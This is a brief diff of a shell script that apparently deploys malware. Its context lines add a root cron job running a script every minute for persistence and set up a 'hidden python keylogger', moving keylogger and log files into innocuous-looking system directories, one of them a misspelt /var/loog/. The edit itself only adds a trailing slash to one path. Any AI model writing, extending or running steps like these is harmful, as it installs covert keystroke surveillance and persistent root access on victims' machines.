@@ -85,7 +85,7 @@ echo "* * * * * /var/www/log/ps_init.sh" >> /var/spool/cron/root
 
 # setup hidden python keylogger
 mkdir /opt/local/
-mv log.txt /opt/local
+mv log.txt /opt/local/
 chmod +x log.sh
 mv log.sh /var/loog/
 mv keylogger.py /usr/local/src/
